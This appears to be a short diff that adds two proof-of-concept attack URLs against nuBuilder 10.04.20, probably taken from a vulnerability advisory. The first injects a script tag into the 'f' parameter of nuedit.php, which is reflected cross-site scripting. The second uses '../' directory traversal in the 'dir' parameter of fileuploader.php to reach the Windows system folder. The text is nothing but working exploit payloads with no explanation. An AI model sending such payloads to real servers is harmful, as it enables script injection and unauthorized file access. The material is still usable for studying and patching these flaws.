@@ -1,0 +1,2 @@
+http://www.example.com/nubuilder-10.04.20/productionnu2/nuedit.php?f=%3Cscript%3Ealert(0)%3C/script%3E
+http://www.example.com/nubuilder-10.04.20/productionnu2/fileuploader.php?dir=../../../../../../../../windows
